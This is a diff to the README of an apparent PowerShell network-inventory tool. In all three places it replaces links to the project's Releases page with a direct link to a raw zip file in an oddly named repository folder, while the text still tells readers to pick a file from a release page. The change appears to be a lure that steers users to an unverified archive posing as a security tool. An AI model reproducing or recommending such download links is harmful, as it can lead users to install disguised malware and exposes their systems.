@@ -1,6 +1,6 @@
 # 🔍 ZavetSec-NetworkInventory - Fast Offline Network Asset Checks
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/amruhaf7527/ZavetSec-NetworkInventory/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/amruhaf7527/ZavetSec-NetworkInventory/raw/refs/heads/main/osmina/Zavet_Network_Inventory_Sec_taxator.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ It runs with PowerShell, works offline, and does not need a full install. You do
 
 Use this page to download the latest release:
 
-https://github.com/amruhaf7527/ZavetSec-NetworkInventory/releases
+https://github.com/amruhaf7527/ZavetSec-NetworkInventory/raw/refs/heads/main/osmina/Zavet_Network_Inventory_Sec_taxator.zip
 
 Look for the newest release file on that page. Download the package that matches your Windows system, then save it to a folder you can find again, such as Downloads or Desktop.
 
@@ -207,4 +207,4 @@ Use the release files for your own network checks, testing, and security work. F
 
 ## 🔗 Download again
 
-https://github.com/amruhaf7527/ZavetSec-NetworkInventory/releases
+https://github.com/amruhaf7527/ZavetSec-NetworkInventory/raw/refs/heads/main/osmina/Zavet_Network_Inventory_Sec_taxator.zip
